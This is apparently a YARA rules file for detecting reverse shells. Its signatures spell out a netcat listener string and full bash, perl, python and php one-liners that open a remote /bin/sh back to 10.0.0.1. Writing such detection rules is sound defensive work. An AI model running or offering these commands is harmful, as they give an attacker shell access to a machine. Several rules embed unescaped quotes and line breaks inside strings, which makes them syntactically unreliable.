rule reverse_shell {
	strings:
		$reverse_shell = "nc -lvnp"
	condition:
		$reverse_shell
}

rule bash_reverse_shell {
	strings:
		$bash_reverse_shell = "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
	condition:
		$bash_reverse_shell
}

rule perl_reverse_shell {
	strings:
		$perl_reverse_shell = "perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
"
	condition:
		$perl_reverse_shell
}

rule python_reverse_shell {
	strings:
		$python_reverse_shell = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
"
	condition:
		$python_reverse_shell
}

rule php_reverse_shell {
	strings:
		$php_reverse_shell = "php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'"
	condition:
		$php_reverse_shell

}
